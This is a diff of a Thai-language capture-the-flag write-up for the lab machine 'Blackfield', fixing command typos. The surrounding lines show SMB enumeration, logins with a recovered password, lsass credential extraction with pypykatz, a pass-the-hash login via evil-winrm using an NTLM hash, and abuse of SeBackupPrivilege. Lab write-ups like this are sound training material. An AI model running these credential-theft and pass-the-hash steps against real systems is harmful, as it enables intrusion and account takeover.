@@ -32,13 +32,15 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 54.29 seconds
 
+```
+
 ## SMB Recon
 
 
 ```bash
-smblient -N -L //10.10.10.192 
+smbclient -N -L //10.10.10.192 
 # พบ Profile ซึ่งคาดว่าจะเป็น User 
-smblient -N  //10.10.10.192/profiles$
+smbclient -N  //10.10.10.192/profiles$
 ```
 
 create user.txt โดยตัด
@@ -449,7 +451,7 @@ smbmap -H 10.10.10.192 -u audit2020 -p 'P@ssw0rd@@@'
 
 จากนั้นทดสอบเข้าไปยัง forensic ด้วย user: audit2020
 ```bash
-smblient  -N //10.10.10.192/forensic -U audit2020@blackfield.local --password=P@ssw0rd@@@
+smbclient  -N //10.10.10.192/forensic -U audit2020@blackfield.local --password=P@ssw0rd@@@
 ```
 
 ภายใต้ folder memory_analysis มีข้อมูลของ lsass อยู่ให้ทำการแตกไฟล์ zip แล้วเปิดด้วย mimikatz บน linux ด้วย pypykatz 
@@ -514,7 +516,7 @@ for service in wmi winrm smb mssql rdp ssh ldap ftp vnc; do netexec $service bla
 ```bash
 evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
 ```
-หลังจากที่ Shell เข้ามาด้วยสิทธิของ svc_backup มาได้จะเห็นว่าเรามีสิทธิของ SeBackupPrivilege ซึ่งเป็นสิทธิที่สามารถอ่านไฟล์ที่มีสิทธิสูงได้ 
+หลังจากที่ Shell เข้ามาด้วยสิทธิของ svc_backup มาได้จะเห็นว่าเรามีสิทธิ์ของ SeBackupPrivilege ซึ่งเป็นสิทธิที่สามารถอ่านไฟล์ที่มีสิทธิสูงได้ 
 ![](./IMG/008.png)
 
 
